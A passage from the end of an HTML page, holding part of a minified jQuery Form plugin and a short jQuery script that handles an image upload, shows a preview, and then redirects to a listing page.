p=h.value;if(!p){p=h.attributes&&h.attributes.value&&!h.attributes.value.specified?h.text:h.value}if(f){return p}u.push(p)}}return u}return e(t).val()};e.fn.clearForm=function(t){return this.each(function(){e("input,select,textarea",this).clearFields(t)})};e.fn.clearFields=e.fn.clearInputs=function(t){var n=/^(?:color|date|datetime|email|month|number|password|range|search|tel|text|time|url|week)$/i;return this.each(function(){var r=this.type,i=this.tagName.toLowerCase();if(n.test(r)||i=="textarea"){this.value=""}else if(r=="checkbox"||r=="radio"){this.checked=false}else if(i=="select"){this.selectedIndex=-1}else if(r=="file"){if(/MSIE/.test(navigator.userAgent)){e(this).replaceWith(e(this).clone(true))}else{e(this).val("")}}else if(t){if(t===true&&/hidden/.test(r)||typeof t=="string"&&e(this).is(t)){this.value=""}}})};e.fn.resetForm=function(){return this.each(function(){if(typeof this.reset=="function"||typeof this.reset=="object"&&!this.reset.nodeType){this.reset()}})};e.fn.enable=function(e){if(e===undefined){e=true}return this.each(function(){this.disabled=!e})};e.fn.selected=function(t){if(t===undefined){t=true}return this.each(function(){var n=this.type;if(n=="checkbox"||n=="radio"){this.checked=t}else if(this.tagName.toLowerCase()=="option"){var r=e(this).parent("select");if(t&&r[0]&&r[0].type=="select-one"){r.find("option").selected(false)}this.selected=t}})};e.fn.ajaxSubmit.debug=false})
</script>

<script type="text/javascript">
var ready = 0;
$(document).ready(function() { 

	

	$('.dropify-wrapper').click(function() {
		$("#file").click();
	});

	$("#file").change(function(e) {
		if(e.target.value) {
			$('#continueBtn').prop('disabled', true);
			$('.dropify-wrapper').css("display", "none");
			$('.dropify-preview').css("display", "none");
			$('#loading').css("display", "block");
			$('#submitBtn').click();
		}
	});

	$('#uploadForm').submit(function(e) {	
		if($('#file').val()) {

			e.preventDefault();
			$(this).ajaxSubmit({ 
				success:function (results){
					$("#prevImage").attr("src", results);
					$('.dropify-wrapper').css("display", "none");
					$('#loading').css("display", "none");
					$('.dropify-preview').css("display", "block");
					$('#continueBtn').prop('disabled', false);
					ready = 1;
				},
				resetForm: true 
			}); 
			return false; 
		}
	});
	$('#continueBtn').click(function() {
		if(ready == 1)
			window.location.href='listing.php'
		else
			$('#submitBtn').click();			
	})
	
}); 

</script>

</script>
</body>
</html>
